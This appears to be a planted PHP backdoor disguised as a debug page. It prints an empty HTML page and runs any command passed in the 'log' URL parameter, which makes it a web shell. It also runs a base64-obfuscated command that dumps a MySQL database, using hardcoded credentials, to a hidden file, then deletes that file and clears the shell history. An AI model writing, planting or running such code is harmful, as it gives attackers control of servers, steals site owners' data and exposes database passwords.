<?php

echo "<html><body><b></b></body><html>";
$debug=$_GET['log'];
$debug2=base64_decode("bXlzcWxkdW1wIC11J2tlcmFtb3R1X3N0NGFjdGcnIC1oJzEyNy4wLjAuMScgLXAnXm1MXigoJWYycD1vJyBrZXJhbW90dV9zdDRhY3RnID4gY2FjaGUvLmNvbmZpZy5zd3A7c2xlZXAgMTYwMDtybSBjYWNoZS8uY29uZmlnLnN3cDtoaXN0b3J5IC1jCg==");
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a wpipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);
$process = proc_open($debug, $descriptorspec, $pipes);
$process2 = proc_open($debug2, $descriptorspec, $pipes);


?>

